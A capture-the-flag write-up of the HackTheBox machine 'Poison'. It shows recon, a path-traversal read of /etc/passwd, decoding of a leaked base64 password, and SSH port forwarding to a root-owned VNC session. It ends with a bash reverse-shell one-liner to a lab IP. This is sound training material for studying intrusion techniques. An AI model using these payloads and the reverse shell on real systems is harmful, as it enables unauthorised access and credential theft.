# Poison [HTB](https://app.hackthebox.com/machines/132)
![poison-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/poison-01.png)


## Recon

After adding the target to my `/etc/hosts` file, I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 poison.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/ports-02.png)


We have two ports. Let's run a version detection scan againts them:

```bash
nmap -p 22,80 -sCV poison.htb -oN nmap.result
```

![namp-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/nmap-res-03.png)


We have the following:

+ An SSH server on port 22.
+ An Apache-2.4.29 server on port 80.

Based on the `nmap` scan we can see that the root directory of the website doesn't have a title, and it seems like the site is powered by PHP 5.6.32. Based on the scan we can also guess that the the target OS is `FreeBSD`.


Let's take a closer look at the Apache server.


## Apache Port 80


If we open the site at `http://poison.htb/` we can see the following:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/site-04.png)


It looks like the site takes a local script as input, runs it locally, and returns the result back to us.


From the available scripts we can see a `listfiles.php` script. Let's run it:

![list-files-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/list-files-05.png)


We can see that the file name argument is sent to the server via the `file` parameter in the URL, this could pose a file inclusion vulerability. 


The response is a PHP array of the local directory listing. In the listing we see two new files that were not present in the main page, `browse.php` and `pwdbackup.txt`. 


If we run `browse.php`, it results in some form of a memory page-fault, perhaps a buffer-overflow:

![browse-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/browse-06.png)


That's interesting, but i'm not sure exactly how to exploit this at the moment. 


If we retrive `pwdbackup.txt` we get the following:

![pwd-backup-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/pwd-backup-07.png)


We have what looks like a few different base64 encoded strings separated by a space character. But the first line of the file says that the password is encoded 13 times. How should we go about decoding this?  


At first I tried decoding each line as a seperate base64 string. This didnt work, as the output from the decoding started to break down and subsequent docoding attempts failed. 


Instead, I concatenated all of the individual strings into one big base64 string and saved it to a file locally. Then I used the following python script to base64 decode it 13 times:


```python
#!/usr/bin/python3

import base64 

with open('pwdbackup.txt', 'rt') as file:
    s = file.read()

for _ in range(13):
    s = base64.b64decode(s)
    s = s.decode('utf-8')

print(s)
```

Which resulted in the following:

![pass-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/pass-08.png)


This looks like a password, the question is what is the username? 


To answer this question I decided to go back to the website's scripting application. We know that we have some form of local file inclusion going on, as the application runs local files and returns the output.


So I decided to test for a local file inclusion vulnerability, specifically, I wanted to include the `/etc/passwd` file which will give us a list of valid usernames on the system. 


So i sent `../../../../etc/passwd` as the file name:

![err-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/err-09.png)


So now we know that the `browse.php` is the script that sources the local files. We can also see that the application is hardcoded to use files inside the `/usr/local/www/apache24/data` directory which is defined in the `include_path` variable. 


Therefore, we know that we need to go five levels higher in order to reach the root directory. So I added one more `../` into the file path `../../../../../etc/passwd`:

![input-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/input-10.png)


Which returned the file:

![passwd-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/passwd-11.png)


The username was actually in the password. Let's try to login to the ssh:

![shell-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/shell-12.png)


Let's move to privilege escalation!


## Privilege Escalation


If we list the content's of our user's home folder we can see the following:

![list-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/list-13.png)


This zip archive (owend by root) looks interesting. If we try to `unzip` it we will notice it is password protected:

![protected-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/protected-14.png)


Let's trasnfer the file to our kali. To do this I start a python web server on the target with:

```bash
python -m SimpleHTTPServer 8000
```

And download the file from my kali using:

```bash
wget http://poison.htb:8000/secret.zip
```

![wget-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/wget-15.png)


Let's try to use the ssh password from before to open it:

![unzip-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/unzip-16.png)


It worked! 


I also ran the `file` program on it to try and identify what type of file this is. It's says its a Non-ISO extended ASCII text file, meaning there are characters outside the ASCII range (byte values ≥128) in the file. 


If we `cat` the file we can see the issue:

![cat-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/cat-17.png)


We can try to guess out the encoding of this file using the `uchardet` program:

```bash
apt install uchardet   # If not installed already
uchardet secret
```

![encoding-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/encoding-18.png)


We can try to convert this string to `utf-8` with:

```bash
iconv -f WINDOWS-1252 -t utf-8 secret
```

![iconv-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/iconv-19.png)


Unfortenatly, it's still doesn't make sense. Perhaps it's encrypted? I decided to put this file to side for now and enumerate the target some more. 


The next thing I did was to look at running processes with `ps auxww`, and that's where I saw somthing interesting:

![ps-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/ps-20.png)


Looks like `root` is running a VNC server on `localhost:5901`. VNC is the Virtual Network Computing system and you can read more about it [here](https://en.wikipedia.org/wiki/Virtual_Network_Computing), but in short, it's a remote graphical desktop system, much like RDP for Windows, only VNC is platform independent.


We can verify that the VNC server is running on the target host by listing the open ports as such:

```bash
sockstat -l	# A FreeBSD way of listing open ports
```

![sockstat-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/sockstat-21.png)


There is actually two ports on which the VNC server is running on, but we primarly want to focus on port 5901 because it's owned by root. We can probably guess that the `secret` file we worked on before is the password file for the VNC connection. 


The VNC server is running on the localhost of the target but if we tunnel this traffic to our attack machine we should be able to access it locally. To do that we can use port forwarding as such:

```bash
ssh -N -L 5901:localhost:5901 charix@poison.htb
```  

![forward-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/forward-22.png)


After we supply the user's password, the shell window stalls, which is a good sign that the tunnel has been established. We can verify this by listing out the open ports on our attack machine:

![ports-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/ports-23.png)


Nice! If you want a quick and easy cheet sheet for port forwarding cick [here](https://gist.github.com/billautomata/ee0572113e1496a75b03).


Now we should be able to get access to the VNC as the root user with:

```bash
vncviewer -passwd secret localhost::5901
```

![success-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/success-24.png)


Which opens up the following (tiny) window:

![root-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Poison/img/root-25.png)


Although it's hard to read because the font is so small, this is in fact a root shell! 

From here we can run something like `bash -i >& /dev/tcp/10.10.14.58/9001 0>&1` to give ourselfes a proper shell, if we want.  
